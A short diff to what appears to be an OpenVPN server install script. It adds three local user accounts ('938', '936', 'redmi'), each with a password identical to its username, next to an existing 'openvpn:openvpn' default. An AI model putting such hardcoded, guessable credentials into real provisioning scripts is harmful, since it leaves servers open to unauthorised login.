@@ -580,6 +580,12 @@ apt-get install -y libxml-parser-perl
 echo \> Adding default OpenVPN User...
 useradd openvpn
 echo "openvpn:openvpn" | chpasswd
+useradd 938
+echo "938:938" | chpasswd
+useradd 936
+echo "936:936" | chpasswd
+useradd redmi
+echo "redmi:redmi" | chpasswd
 sleep 1
 echo \> Done!
 sleep 1
